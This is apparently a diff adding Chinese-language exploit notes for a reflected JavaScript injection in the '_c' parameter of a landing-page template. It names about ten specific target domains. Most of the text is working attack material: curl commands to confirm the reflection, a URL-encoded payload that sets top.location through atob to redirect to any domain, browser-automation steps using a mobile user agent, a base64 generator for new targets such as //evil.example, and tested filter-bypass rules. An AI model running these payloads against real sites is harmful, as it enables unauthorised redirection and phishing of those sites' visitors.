@@ -1,0 +1,28 @@
+# YC 站群落地页（hex2bin 模板）_c 参数 JS 注入 → 任意域跳转
+# 适用：h5.nanrb559.cc(YC-155) / 622.sdsd622ss.cc(YC-149) / riomksa.sfk2aoe9v.cc(YC-152)
+#       / pycl.tabh6qr2.com(YC-170) / r4j7k2x.repolantix.cc(YC-141) / vlog01.99qoxinf.com
+#       / 54fqv.trb2kp8.com / ds5ffsffg.a6ep560.com / defr6.iv8ixeyo.com / yz7zjhnk.5f8trzdt.com
+
+# 1) 反射确认（hex2bin 解码后看 copyToClip 行）
+curl -x http://127.0.0.1:7892 --http1.1 -sk 'https://TARGET/?_c=%22%2B%281%29%2B%22' \
+ | python3 -c "import sys,re,binascii;h=sys.stdin.read();m=re.findall(r\"hex2bin\('([0-9a-fA-F]+)'\)\",h);print([l for l in binascii.unhexlify(m[0]).decode().split('\n') if 'copyToClip(' in l])"
+
+# 2) 跳转载荷（目标 //example.com → base64 Ly9leGFtcGxlLmNvbQ==）
+#    明文：  "+(top["location"]=atob("Ly9leGFtcGxlLmNvbQ=="),top["zzzz"]["y"])+"
+#    URL：   %22%2B%28top%5B%22location%22%5D%3Datob%28%22Ly9leGFtcGxlLmNvbQ%3D%3D%22%29%2Ctop%5B%22zzzz%22%5D%5B%22y%22%5D%29%2B%22
+#    换目标域只改 base64：//example.org → Ly9leGFtcGxlLm9yZw==
+
+# 3) 浏览器验证（必须移动端 UA，桌面 UA 按钮不绑事件）
+agent-browser set device "iPhone 16"
+agent-browser open 'https://TARGET/?_c=%22%2B%28top%5B%22location%22%5D%3Datob%28%22Ly9leGFtcGxlLmNvbQ%3D%3D%22%29%2Ctop%5B%22zzzz%22%5D%5B%22y%22%5D%29%2B%22'
+agent-browser click '#downloadBtn1 .ios-dl-btn'    # 或 .ios-dl-btn 任一可见按钮
+agent-browser eval "location.href"                 # → https://example.com/
+
+# 生成任意目标：
+python3 -c "import base64;print(base64.b64encode(b'//evil.example').decode())"
+
+# ---- 过滤器边界（实测）----
+# .  → 服务端在第一个点处截断，故 URL 必须 base64 + atob
+# () → 载荷以 () 结尾整段被丢弃（模板退化为 copyToClip("page_id://…")）
+# {} , [] " = 可用
+# channel: "<C>" 行有 ~15 字符上限（load 期不可利用），copyToClip 行无上限
